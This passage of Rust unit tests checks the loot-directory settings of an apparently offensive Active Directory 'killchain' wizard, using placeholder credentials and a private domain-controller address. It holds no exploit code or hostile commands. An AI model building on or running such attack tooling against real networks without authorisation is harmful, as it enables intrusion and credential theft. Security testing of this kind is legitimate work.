            username: "admin".into(),
            password: "pass".into(),
            target_hosts: vec![],
            output_dir: None,
            ldaps: false,
            use_hash: false,
        };
        let wizard = KillchainWizard::new(config);
        assert_eq!(wizard.loot_dir, PathBuf::from("./loot"));
    }

    #[test]
    fn wizard_new_custom_loot_dir() {
        let config = WizardConfig {
            dc_host: "10.0.0.1".into(),
            domain: "corp.local".into(),
            username: "admin".into(),
            password: "pass".into(),
            target_hosts: vec![],
            output_dir: Some("/tmp/myloot".into()),
            ldaps: false,
            use_hash: false,
        };
        let wizard = KillchainWizard::new(config);
        assert_eq!(wizard.loot_dir, PathBuf::from("/tmp/myloot"));
    }
}
